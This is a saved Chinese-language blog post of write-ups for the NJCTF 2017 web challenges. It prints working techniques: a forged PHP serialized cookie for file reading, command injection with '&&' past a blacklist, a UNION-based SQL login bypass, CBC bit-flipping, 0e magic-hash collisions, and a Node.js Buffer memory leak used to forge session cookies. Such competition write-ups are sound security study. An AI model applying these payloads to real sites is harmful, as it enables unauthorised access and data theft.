<!DOCTYPE html>

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<title>NJCTF2017-Web – Wupco's Blog</title>
<script src="./NJCTF2017-Web – Wupco's Blog/jquery.jsver=1.12.4" type="text/javascript"></script>
<script src="./NJCTF2017-Web – Wupco's Blog/jquery-migrate.min.jsver=1.4.1" type="text/javascript"></script>
<link href="http://www.wupco.cn/?rest_route=/" rel="https://api.w.org/"/>
<link href="http://www.wupco.cn/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./NJCTF2017-Web – Wupco's Blog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<link href="./NJCTF2017-Web – Wupco's Blog/p=2087" rel="prev" title="SQLMAP|阅读手记四{conf.dbmsHandler，conf.dumper}"/>
<link href="./NJCTF2017-Web – Wupco's Blog/p=2554" rel="next" title="0CTF2017|Web"/>
<link href="./NJCTF2017-Web – Wupco's Blog/p=2169" rel="canonical"/>
<link href="./NJCTF2017-Web – Wupco's Blog/p=2169" rel="shortlink"/>
<script src="./NJCTF2017-Web – Wupco's Blog/shCore.js" type="text/javascript"></script><link href=" http://www.wupco.cn/wp-content/plugins/wp-ueditor2/ueditor/third-party/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css"/><link href="./NJCTF2017-Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="32x32"/>
<link href="./NJCTF2017-Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="192x192"/>
<link href="./NJCTF2017-Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="apple-touch-icon-precomposed"/>
<meta content="http://www.wupco.cn/wp-content/uploads/2016/11/R5K8RH7ACHA7KEV8P.gif" name="msapplication-TileImage">
<link href="./NJCTF2017-Web – Wupco's Blog/favicon.png" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
<link href="./NJCTF2017-Web – Wupco's Blog/style.css" rel="stylesheet" type="text/css">
<!--[if lt IE 9]>
<script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script>
<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</link></meta></head>
<body>
<div class="container" id="main">
<div class="pjax">
<header id="header">
<div class="container">
<h1 class="logo">
<i class="iconfont"></i><a href="http://www.wupco.cn">Wupco's Blog</a>
</h1>
<nav class="menu_click" id="topMenu">
<div class="menu-menu-1-container"><ul class="menu" id="menu-menu-1"><li><a href="http://www.wupco.cn/">首页</a></li>
<li><a href="http://www.wupco.cn/?page_id=1174">关于我</a></li>
<li><a href="http://www.wupco.cn/?page_id=1448">数据备份</a></li>
<li><a href="http://www.wupco.cn/?page_id=1959">CTF备忘录</a></li>
</ul></div><i class="i_1"></i>
<i class="i_2"></i>
</nav>
</div>
</header>
<section class="blockGroup">
<h2 class="s_title" itemprop="name headline">NJCTF2017-Web</h2>
<article class="post single" itemscope="" itemtype="http://schema.org/BlogPosting">
<h1><a id="post-2169-_963b50456nal"></a><strong>NJCTF 2017</strong></h1>
<h2><a id="post-2169-_6tf3mh6f884t"></a>WEB</h2>
<h3><a id="post-2169-_blctej6y7mlx"></a><strong>Login</strong></h3>
<p> </p>
<p>超长字符串： admin 中间空格 0 &amp;password=自己的密码</p>
<p>然后用admin和自己的密码登录。</p>
<p> we search the database, and you are admin .</p>
<p>welcome, admin. your flag is NJCTF{4R3_Y0u_7H3_Re41_aDM1N?}</p>
<h3><a id="post-2169-_jtmopyajp5dv"></a><strong>Blog</strong></h3>
<p><img class="wp-image-2237" src="./NJCTF2017-Web – Wupco's Blog/34771489497437.png"/></p>
<p>首先下载源码，是Ruby写的站</p>
<p>在Controller里面</p>
<p><img class="wp-image-2239" src="./NJCTF2017-Web – Wupco's Blog/39531489497437.png"/><img class="wp-image-2241" src="./NJCTF2017-Web – Wupco's Blog/9261489497437.png"/>发现注册的时候，有个额外参数，试着附加这个参数=1，即成了管理员</p>
<p>登陆后发现就多了个删除用户功能<img class="wp-image-2243" src="./NJCTF2017-Web – Wupco's Blog/14541489497437.png"/>后来无意间点开F12查看源码。。在注释里发现Flag<img class="wp-image-2244" src="./NJCTF2017-Web – Wupco's Blog/21291489497437.png"/></p>
<h3><a id="post-2169-_7dppna6q83k1"></a><strong>Textwall</strong></h3>
<p><a href="http://218.2.197.235:23721/">http://218.2.197.235:23721/</a><img class="wp-image-2246" src="./NJCTF2017-Web – Wupco's Blog/27301489497437.png"/>lists=35e0e1972f48f19b01fcb2bacb5e9023bf388fdda:1:{i:0;s:1:""";}<br/>
 </p>
<p>前面是由SHA1加密的后面的序列化串</p>
<p><a href="http://218.2.197.235:23721/.index.php.swo">http://218.2.197.235:23721/.index.php.swo</a>找到下面部分源码</p>
<pre class="brush:php;toolbar:false">&lt;?php
 $lists = [];
 Class filelist{
     public function __toString()
     {
         return highlight_file('hiehiehie.txt', true).highlight_file($this-&gt;source, true);
     }
 }
 ........
 ?&gt;</pre>
<p><span style="font-family:'Arial Unicode MS'">写个php构造反序列化串到lists</span></p>
<pre class="brush:php;toolbar:false">&lt;?php
 
Class filelist{
    public function __toString()
    {
        return highlight_file('hiehiehie.txt', true).highlight_file($this-&gt;source, true);
    }
}
$a = new filelist;
$a -&gt;source = "index.php";
$b = array("test",$a);
$c = serialize($b);
$d = sha1($c).$c;
echo urlencode($d);</pre>
<p><img class="wp-image-2249" src="./NJCTF2017-Web – Wupco's Blog/86841489497437.png"/></p>
<p><img class="wp-image-2250" src="./NJCTF2017-Web – Wupco's Blog/57781489497437.png"/><img class="wp-image-2251" src="./NJCTF2017-Web – Wupco's Blog/93061489497437.png"/> </p>
<pre class="brush:php;toolbar:false">&lt;?php
//The flag is /var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g
$lists = [];
Class filelist{
    public function __toString()
    {
        return highlight_file('hiehiehie.txt', true).highlight_file($this-&gt;source, true);
    }
}
if(isset($_COOKIE['lists'])){
    $cookie = $_COOKIE['lists'];
    $hash = substr($cookie, 0, 40);
    $sha1 = substr($cookie, 40);
    if(sha1($sha1) === $hash){
        $lists = unserialize($sha1);
    }
}
if(isset($_POST['hiehiehie'])){
    $info = $_POST['hiehiehie'];
    $lists[] = $info;
    $sha1 = serialize($lists);
    $hash = sha1($sha1);
    setcookie('lists', $hash.$sha1);
    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Please Get Flag!!&lt;/title&gt;
  &lt;meta charset="utf-8"&gt;
  &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
  &lt;link rel="stylesheet" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css"&gt; 
  &lt;script src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;
  &lt;script src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
    &lt;div&gt;
        &lt;h1&gt;Please Get Flag!!&lt;/h1&gt;
    &lt;/div&gt;
    &lt;div&gt;
        &lt;?php foreach($lists as $info):?&gt;
            &lt;div&gt;
              &lt;h3&gt;&lt;?=$info?&gt;&lt;/h3&gt;
            &lt;/div&gt;
        &lt;?php endforeach;?&gt;
    &lt;/div&gt;
    &lt;form method="post" href="."&gt;
        &lt;input name="hiehiehie" value="hiehiehie"&gt;
        &lt;input type="submit" value="submit"&gt;
    &lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
然后把index.</pre>
<p>然后把index.php改成/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</p>
<p>再次跑一下，得到最后的flag<img class="wp-image-2252" src="./NJCTF2017-Web – Wupco's Blog/61781489497437.png"/></p>
<h3><a id="post-2169-_aexlopmlxwdo"></a><strong>GET FLAG</strong></h3>
<p><span style="font-family:'Arial Unicode MS'">首先随便填了个网站，出现下面的报错：</span></p>
<p>cat: images/http://123.206.216.198:8565: No such file or directory</p>
<p><span style="font-family:'Arial Unicode MS'">看来是cat命令，用;和|都被WAF拦截了，于是只能用&amp;&amp;</span></p>
<p>1.jpg&amp;&amp;ls</p>
<p><span style="font-family:'Arial Unicode MS'">base64</span><span style="font-family:'Arial Unicode MS'">解码后能看到当前目录文件</span></p>
<p> </p>
<p><span style="font-family:'Arial Unicode MS'">然后拖下来代码（貌似并没什么用</span></p>
<p><span style="font-family:'Arial Unicode MS'">可以看到过滤了一大堆，很难去弹shell..</span></p>
<p> </p>
<pre class="brush:python;toolbar:false">from flask import Flask, render_template, request
import commands,base64,time
 
app = Flask(__name__)
blacklist = [';', '&gt;', '&lt;', '|', '$', '`', '(', ')', "mv", "rm", "cp", "python", "perl", "ruby", "bash", "zsh", '~', '*', '-', 'echo']
 
@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")
 
 
@app.route('/hehe', methods=['POST'])
def hehe():
    time.sleep(5)
    img = request.form["flag"]
    for hacker in blacklist:
        if hacker in img:
            return render_template("bad.html")
    image = commands.getstatusoutput('cat images/' + img)
    messages = base64.b64encode(image[1])
    return render_template("image.html", image=messages)
 
if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port='3000')
    except Exception as e:
        print ("Exception:")</pre>
<p><span style="font-family:'Arial Unicode MS'">最终在根目录找到flag</span></p>
<p><img class="wp-image-2253" src="./NJCTF2017-Web – Wupco's Blog/82081489497437.png"/></p>
<p>输入：1.jpg&amp;&amp;cat /9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag，得到：</p>
<p>NJCTF{Simp13_Pyth0n_C0de_Inj3cti0n_a77ack}</p>
<h3><a id="post-2169-_nfqrbt26fp80"></a><strong>BE ADMIN</strong></h3>
<p><span style="font-family:'Arial Unicode MS'">index.bak</span><span style="font-family:'Arial Unicode MS'">拖到源码</span></p>
<p> </p>
<pre class="brush:php;toolbar:false">&lt;?php
error_reporting(0);
define("SECRET_KEY", "......");
define("METHOD", "aes-128-cbc");
 
session_start();
 
function get_random_token(){
    $random_token='';
    for($i=0;$i&lt;16;$i++){
        $random_token.=chr(rand(1,255));
    }
    return $random_token;
}
 
function get_identity()
{
    global $defaultId;
    $j = $defaultId;
    $token = get_random_token();
    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("ID", base64_encode($c));
    setcookie("token", base64_encode($token));
    if ($j === 'admin') {
        $_SESSION['isadmin'] = true;
    } else $_SESSION['isadmin'] = false;
 
}
 
function test_identity()
{
    if (!isset($_COOKIE["token"]))
        return array();
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {
            if ($u === 'admin') {
                $_SESSION['isadmin'] = true;
            } else $_SESSION['isadmin'] = false;
        } else {
            die("ERROR!");
        }
    }
}
 
function login($encrypted_pass, $pass)
{
    $encrypted_pass = base64_decode($encrypted_pass);
    $iv = substr($encrypted_pass, 0, 16);
    $cipher = substr($encrypted_pass, 16);
    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $pass;
}
 
 
 
function need_login($message = NULL) {
    echo "   &lt;!doctype html&gt;
        &lt;html&gt;
        &lt;head&gt;
        &lt;meta charset=\"UTF-8\"&gt;
        &lt;title&gt;Login&lt;/title&gt;
        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;
            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;
        &lt;/head&gt;
        &lt;body&gt;";
    if (isset($message)) {
        echo "  &lt;div&gt;" . $message . "&lt;/div&gt;\n";
    }
    echo "&lt;form method=\"POST\" action=''&gt;
            &lt;div class=\"body\"&gt;&lt;/div&gt;
                      &lt;div class=\"grad\"&gt;&lt;/div&gt;
                          &lt;div class=\"header\"&gt;
                                 &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;
                          &lt;/div&gt;
                          &lt;br&gt;
                          &lt;div class=\"login\"&gt;
                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;
                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;              
                        &lt;input type=\"submit\" value=\"Login\"&gt;
                    &lt;/div&gt;
                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;
            &lt;/form&gt;
        &lt;/body&gt;
    &lt;/html&gt;";
}
 
function show_homepage() {
    echo "&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;";
    global $flag;
    printf("Hello ~~~ ctfer! ");
    if ($_SESSION["isadmin"])
        echo $flag;
    echo "&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;";
 
}
 
if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    $query = "SELECT username, encrypted_pass from users WHERE username='$username'";
    $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . "[$query]");
    if ($row = $res-&gt;fetch_assoc()) {
        $uname = $row['username'];
        $encrypted_pass = $row["encrypted_pass"];
    }
 
    if ($row &amp;&amp; login($encrypted_pass, $password)) {
        echo "you are in!" . "&lt;/br&gt;";
        get_identity();
        show_homepage();
    } else {
        echo "&lt;script&gt;alert('login failed!');&lt;/script&gt;";
        need_login("Login Failed!");
    }
 
} else {
    test_identity();
    if (isset($_SESSION["id"])) {
        show_homepage();
    } else {
        need_login();
    }
}</pre>
<p> </p>
<p> </p>
<p><span style="font-family:'Arial Unicode MS'">这里利用sql注入绕过登录，payload如下：</span></p>
<p> </p>
<p>```</p>
<p>username=-1' union select 1,1 %23</p>
<p>password=0</p>
<p>```</p>
<p><span style="font-family:'Arial Unicode MS'">CBC</span><span style="font-family:'Arial Unicode MS'">字节翻转</span></p>
<p><span style="font-family:'Arial Unicode MS'">认证成功过后，就是利用Padding Oracle攻击获取`$_SESSION["id"]`解密后的中间值value, 然后伪造IV, 使得 `IV XOR value = 'admin' + string(0x11）* 11`, 即可。Padding Oracle攻击能获取value的后15位字符[31, 98, 136, 77, 18, 192, 207, 77, 124, 202, 38, 195, 172, 216, 123],第一位字符只需循环遍历就可以拿到flag了。</span></p>
<h3><a id="post-2169-_wx8zqdmbuap1"></a><strong>Wallet</strong></h3>
<p><span style="font-family:'微软雅黑',sans-serif">提示说有压缩包 </span></p>
<p><span style="font-family:'微软雅黑',sans-serif">于是 </span><a href="http://www.zip/"><span style="font-family:'微软雅黑',sans-serif;color:#1155CC">www.zip</span></a> <span style="font-family:'微软雅黑',sans-serif">下载下来</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">弱口令为njctf2017</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">是个加密的php文件</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">3</span><span style="font-family:'微软雅黑',sans-serif">块钱解密</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">得到源码</span></p>
<pre class="brush:php;toolbar:false">&lt;?php
require_once "db.php";
$auth = 0;
if (isset($_COOKIE["auth"])) {
       $auth = $_COOKIE["auth"];
       $hsh = $_COOKIE["hsh"];
       if ($auth == $hsh) {
              $auth = 0;
       } else {
              if (sha1((string) $hsh) == md5((string) $auth)) {
                     $auth = 1;
              } else {
                     $auth = 0;
              }
       }
} else {
       $auth = 0;
       $s = $auth;
       setcookie("auth", $s);
       setcookie("hsh", sha1((string) $s));
}
if ($auth) {
       if (isset($_GET['query'])) {
              $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
              $qstr = SQLITE3::escapeString($_GET['query']);
              $query = "SELECT amount FROM my_wallets WHERE id={$qstr}";
              $result = $db-&gt;querySingle($query);
              if (!$result === NULL) {
                     echo "Error - invalid query";
              } else {
                     echo "Wallet contains: {$result}";
              }
       } else {
              echo "&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;";
       }
} else {
       echo "Sorry, not authorized.";
}</pre>
<p><span style="font-family:'微软雅黑',sans-serif"></span></p>
<p><span style="font-family:'微软雅黑',sans-serif">首先权限问题</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">构造SHA1(str1) =MD5(str2)</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">利用php弱类型判断</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">“0exxxxxxx”=”0eyyyyyyy”</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">碰撞到0e开头的SHA1</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">10932435112 =&gt; </span><span style="font-size:13px;line-height:115%;background:#FFEDC4">0e07766915004133176347055865026311692244</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">0e</span><span style="font-family:'微软雅黑',sans-serif">开头的md5</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">240610708 =&gt; </span><span style="font-size:13px;line-height:115%;font-family:'微软雅黑',sans-serif;background:#FFEDC4">0e462097431906509019562988736854</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">然后，是sqlite注入</span></p>
<p><img class="wp-image-2254" src="./NJCTF2017-Web – Wupco's Blog/97351489497437.png"/><img class="wp-image-2255" src="./NJCTF2017-Web – Wupco's Blog/24061489497437.png"/></p>
<h3><a id="post-2169-_o0hrhnqwzz8p"></a><strong>Chall I | Chall 2</strong></h3>
<p>完全由NodeJs写的站<img class="wp-image-2256" src="./NJCTF2017-Web – Wupco's Blog/49531489497437.png"/><img class="wp-image-2257" src="./NJCTF2017-Web – Wupco's Blog/81471489497437.png"/>刚开始一直考虑构造json里面包含数字 </p>
<p> 这样客户端Buffer解释器解析的时候就会被down掉，造成内存泄露 </p>
<p>后来一直出现这种提示<img class="wp-image-2258" src="./NJCTF2017-Web – Wupco's Blog/61201489497437.png"/></p>
<p><span style="font-family:'微软雅黑',sans-serif">NOT A STRING OR A BUFFER</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">很无奈，做了将近一天。</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">后来下午的时候，我在想或许是github上有源码？</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">搜索了一发，关键词：bibibibibibibi….~(很无语......)</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">果然发现了源码.....</span></p>
<p><a href="https://github.com/0lddriver/app/tree/04df96febdc004cbe8b66d6aff7a33e7ff8db70b"><span style="font-family:'微软雅黑',sans-serif;color:#1155CC">https://github.com/0lddriver/app/tree/04df96febdc004cbe8b66d6aff7a33e7ff8db70b</span></a></p>
<p><span style="font-family:'微软雅黑',sans-serif">走起。</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">在index.js发现</span></p>
<pre class="brush:js;toolbar:false">router.post('/login', function(req, res, next) {
     if(req.body.password !== undefined) {
         var endata = crypto.createHash('md5').update(req.body.password).digest("hex");
         if (reg.test(endata)) {
             var pwd = parseInt(endata.slice(0,3),10);
             password = new Buffer(pwd);
             if(password.toString('base64') == config.secret_password) {
                 req.session.admin = 'yes';
                 res.json({'status': 'ok' });
             }else{
                 res.json({'status': 'error', 'error': 'password wrong: '+password.toString()});
             }
         }else{
             res.json({'status': 'error', 'error': 'password wrong: '+endata.toString()});
         }
     } else {
         res.json({'status': 'error', 'error': 'password missing' });
     }
 });</pre>
<p><span style="font-family:'微软雅黑',sans-serif"> <br/> </span></p>
<p><span style="font-family:'微软雅黑',sans-serif">这个逻辑是首先判断是否有密码输入</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">如果有就把密码先md5加密，然后再hex编码</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">然后经过正则的检测</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">var reg = /^[0-9]*$/;</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">只有hex后为纯数字的才可以通过</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">通过了之后，取前三位转换成10进制 再由buffer解析触发漏洞</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">写脚本碰撞一下</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">3492072592</span></p>
<p><span style="font-family:'微软雅黑',sans-serif">这个符合要求，且能泄露较多的内存（经过处理后数字足够大）</span></p>
<p>）<img class="wp-image-2259" src="./NJCTF2017-Web – Wupco's Blog/46941489497437.png"/></p>
<p>然后就是无脑burp扫了，勾选上grep为NJCTF</p>
<p><img class="wp-image-2260" src="./NJCTF2017-Web – Wupco's Blog/49611489497437.png"/></p>
<p>得到flag1</p>
<p>NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver} </p>
<p>得到的key就是config.js中的session_key, 有了session_key就可以伪造cookie了，本地搭建环境，得到cookie中的session.sig和session，然后伪造这两个cookie访问目标站点的“/admin”得到base64编码的flag，解码得NJCTF{N0d5JS是世界上最好的语言，对吗？}<a id="post-2169-_kp7yorpwn9y6"></a></p>
</article>
<section class="ending">
<ul class="sns">
<li class="tencent"><a href="http://wpa.qq.com/msgrd?v=3&amp;uin=827977014&amp;site=qq&amp;menu=yes" target="_blank"><i class="iconfont"></i></a></li>
<li class="zhihu"><a href="https://www.zhihu.com/people/wupco " target="_blank"><i class="iconfont"></i></a></li>
</ul>
<div class="reward">
                打
                <ul>
<li><img src="./NJCTF2017-Web – Wupco's Blog/QQ图片20170222193616.png"/>用支付宝打我</li>
<li><img src="./NJCTF2017-Web – Wupco's Blog/QQ图片20170222193616.png"/>用微信打我</li>
</ul>
</div>
<div class="about">
<img alt="" class="avatar avatar-80 photo" height="80" src="./NJCTF2017-Web – Wupco's Blog/cd0d984309c15bd1f668df0d0343eccds=80&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/cd0d984309c15bd1f668df0d0343eccd?s=160&amp;d=mm&amp;r=g 2x" width="80"> <p></p>
</img></div>
</section>
<!-- You can start editing here. -->
<h3 id="comments">
		一条回应：“NJCTF2017-Web”	</h3>
<div class="navigation">
<div class="alignleft"></div>
<div class="alignright"></div>
</div>
<ol class="commentlist">
<li class="comment even thread-even depth-1" id="comment-13">
<div class="comment-body" id="div-comment-13">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-32 photo" height="32" src="./NJCTF2017-Web – Wupco's Blog/4f2eb556e132007beec9ef38c244fdc8s=32&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/4f2eb556e132007beec9ef38c244fdc8?s=64&amp;d=mm&amp;r=g 2x" width="32"> <cite class="fn">s1n</cite><span class="says">说道：</span> </img></div>
<div class="comment-meta commentmetadata"><a href="http://www.wupco.cn/?p=2169#comment-13">
			2017年3月15日 上午1:04</a> </div>
<p>PHP才是最好的语言（）</p>
<div class="reply"><a aria-label="回复给s1n" class="comment-reply-link" href="http://www.wupco.cn/?p=2169&amp;replytocom=13#respond" onclick='return addComment.moveForm( "div-comment-13", "13", "respond", "2169" )' rel="nofollow">回复</a></div>
</div>
</li><!-- #comment-## -->
</ol>
<div class="navigation">
<div class="alignleft"></div>
<div class="alignright"></div>
</div>
<div class="comment-respond" id="respond">
<h3 class="comment-reply-title" id="reply-title">发表评论 <small><a href="/?p=2169#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">取消回复</a></small></h3> <form action="http://www.wupco.cn/wp-comments-post.php" class="comment-form" id="commentform" method="post">
<p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea aria-required="true" cols="45" id="comment" maxlength="65525" name="w" required="required" rows="8"></textarea><textarea cols="100%" name="comment" rows="4" style="display:none"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input aria-required="true" id="author" maxlength="245" name="author" required="required" size="30" type="text" value=""/></p>
<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input aria-describedby="email-notes" aria-required="true" id="email" maxlength="100" name="email" required="required" size="30" type="text" value=""/></p>
<p class="comment-form-url"><label for="url">站点</label> <input id="url" maxlength="200" name="url" size="30" type="text" value=""/></p>
<p class="form-submit"><input class="submit" id="submit" name="submit" type="submit" value="发表评论"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="2169"/>
<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
</p> </form>
</div><!-- #respond -->
</section>
<div class="clearer"></div>
<nav class="navigator">
</nav>
</div>
</div>
<div class="clearer"></div>
<div class="search">
<form action="http://www.wupco.cn" method="get">
<input autocomplete="off" class="search_key" name="s" placeholder="Enter search keywords..." required="required" type="text" value=""/>
<button alt="Search" type="submit">Search</button>
</form>
</div>
<footer id="footer">
<section class="links_adlink">
<ul class="container">
</ul>
</section>
友情链接:<a href="http://www.hazzel.cn">Hazzel师傅</a> <a href="http://www.yqxiaojunjie.com/">俊杰师傅</a> <a href="http://margular.github.io">sunshine</a> <a href="https://3wapp.github.io/">janes师傅</a><br/> <a href="http://www.au1ge.xyz/">au1ge</a><br/>
© 2017 <a href="http://www.wupco.cn">Wupco's Blog</a>
<a class="back2top"></a>
</footer>
<script type="text/javascript">SyntaxHighlighter.all();</script><script type="text/javascript">
/* <![CDATA[ */
var ajaxcomment = {"ajax_url":"http:\/\/www.wupco.cn\/wp-admin\/admin-ajax.php","order":"asc","formpostion":"top"};
/* ]]> */
</script>
<script src="./NJCTF2017-Web – Wupco's Blog/app.jsver=20141010" type="text/javascript"></script>
<script style="display:none">
function index_overloaded(){

}
</script>
<script src="./NJCTF2017-Web – Wupco's Blog/jquery.min.js"></script>
<script src="./NJCTF2017-Web – Wupco's Blog/functions.js"></script>
<script>
</script>
</body>
</html>